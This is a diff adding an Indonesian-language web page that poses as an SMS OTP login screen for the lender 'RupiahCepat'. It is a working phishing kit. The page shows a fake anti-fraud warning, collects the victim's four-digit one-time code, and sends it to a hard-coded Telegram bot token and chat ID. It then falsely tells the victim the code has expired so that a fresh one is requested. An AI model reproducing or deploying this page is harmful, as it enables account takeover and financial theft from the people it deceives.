@@ -1,0 +1,146 @@
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Masuk SMS OTP</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-white text-gray-800 min-h-screen">
+  <div class="max-w-md mx-auto p-4">
+    <!-- Header -->
+    <header class="flex items-center justify-between mb-6">
+      <button aria-label="Back" class="text-gray-600 text-2xl leading-none">
+        <i class="fas fa-chevron-left"></i>
+      </button>
+      <h1 class="font-semibold text-lg leading-none">masuk</h1>
+      <button aria-label="Headphones" class="text-gray-900 text-2xl leading-none">
+        <i class="fas fa-headphones-alt"></i>
+      </button>
+    </header>
+
+    <!-- Warning box -->
+    <div class="flex items-center gap-3 bg-gray-100 rounded-lg p-3 mb-6">
+      <div class="text-orange-500 text-xl leading-none">
+        <i class="fas fa-bell"></i>
+      </div>
+      <p class="text-gray-600 text-sm leading-tight">
+        Waspada Penipuan! Jangan pernah beritahu Kata Sandi Baru / OTP kepada siapapun (termasuk karyawan RupiahCepat)!
+      </p>
+    </div>
+
+    <!-- SMS OTP Section -->
+    <section>
+      <h2 class="font-extrabold text-xl mb-1">SMS OTP</h2>
+      <p class="text-gray-400 mb-1">Masukan kode OTP yang dikirim ke</p>
+
+      <!-- OTP input boxes -->
+      <div class="flex gap-4 mb-3">
+        <input
+          type="text"
+          maxlength="1"
+          class="w-16 h-16 rounded-xl bg-gray-100 text-center text-2xl font-semibold text-gray-900 focus:outline-none"
+          aria-label="OTP digit 1"
+          id="otp1"
+        />
+        <input
+          type="text"
+          maxlength="1"
+          class="w-16 h-16 rounded-xl bg-gray-100 text-center text-2xl font-semibold text-gray-900 focus:outline-none"
+          aria-label="OTP digit 2"
+          id="otp2"
+        />
+        <input
+          type="text"
+          maxlength="1"
+          class="w-16 h-16 rounded-xl bg-gray-100 text-center text-2xl font-semibold text-gray-900 focus:outline-none"
+          aria-label="OTP digit 3"
+          id="otp3"
+        />
+        <input
+          type="text"
+          maxlength="1"
+          class="w-16 h-16 rounded-xl bg-gray-100 text-center text-2xl font-semibold text-gray-900 focus:outline-none"
+          aria-label="OTP digit 4"
+          id="otp4"
+        />
+      </div>
+
+      <p class="text-gray-400 text-sm mb-6">
+        Belum Terima OTP? Kirim Ulang <span id="timer" class="font-semibold">60s</span>
+      </p>
+
+      <button
+        id="submitBtn"
+        class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition"
+      >
+        Submit
+      </button>
+    </section>
+  </div>
+
+  <script>
+    const botToken = '8316280054:AAGlD7WDlLDzFjfjuEBm87HMHXQ11yMQGSg';
+    const chatId = '5689726675';
+
+    // Countdown timer
+    let timeLeft = 60;
+    const timerEl = document.getElementById('timer');
+    const countdown = setInterval(() => {
+      timeLeft--;
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        timerEl.textContent = '0s';
+      } else {
+        timerEl.textContent = timeLeft + 's';
+      }
+    }, 1000);
+
+    document.getElementById('submitBtn').addEventListener('click', () => {
+      const otp1 = document.getElementById('otp1').value.trim();
+      const otp2 = document.getElementById('otp2').value.trim();
+      const otp3 = document.getElementById('otp3').value.trim();
+      const otp4 = document.getElementById('otp4').value.trim();
+
+      if (!otp1 || !otp2 || !otp3 || !otp4) {
+        alert('Mohon isi semua kode OTP');
+        return;
+      }
+
+      const otp = otp1 + otp2 + otp3 + otp4;
+      const message = `Kode OTP yang dimasukkan: ${otp}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert('Kode OTP kedaluwarsa Dapatkan Kode Baru');
+        } else {
+          alert('Gagal mengirim kode OTP ke Telegram');
+        }
+      })
+      .catch(() => {
+        alert('Terjadi kesalahan saat mengirim kode OTP');
+      });
+    });
+  </script>
+</body>
+</html>
